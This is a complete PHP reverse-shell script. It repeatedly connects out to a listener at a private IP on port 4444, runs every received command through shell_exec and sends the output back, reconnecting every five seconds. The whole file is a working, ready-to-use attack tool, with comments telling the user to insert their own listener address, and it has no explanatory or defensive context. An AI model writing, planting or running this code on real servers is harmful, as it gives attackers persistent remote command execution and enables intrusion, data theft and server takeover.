<?php
$ip = '10.0.2.5'; // Replace with your listener's IP
$port = 4444;    // Your listener's port

while (true) {
    $sock = fsockopen($ip, $port);
    if ($sock) {
        // Initial greeting
        fwrite($sock, "Connected to reverse shell. Type 'exit' to close the connection.\n");
        fwrite($sock, "Shell> ");

        while (!feof($sock)) {
            // Get command from the listener
            $cmd = fgets($sock);
            $cmd = trim($cmd); // Trim whitespace

            // Exit command
            if ($cmd == 'exit') {
                fwrite($sock, "Closing connection...\n");
                break;
            }

            // Execute the command and capture both stdout and stderr
            $output = shell_exec($cmd . ' 2>&1');

            // If the output is empty, show a message
            if (empty($output)) {
                $output = "No output or command not found.";
            }

            // Send back the output
            fwrite($sock, $output . "\n");
            fwrite($sock, "Shell> "); // Prompt for next command
        }
        fclose($sock);
    }
    // Wait before trying to reconnect
    sleep(5);
}
?>
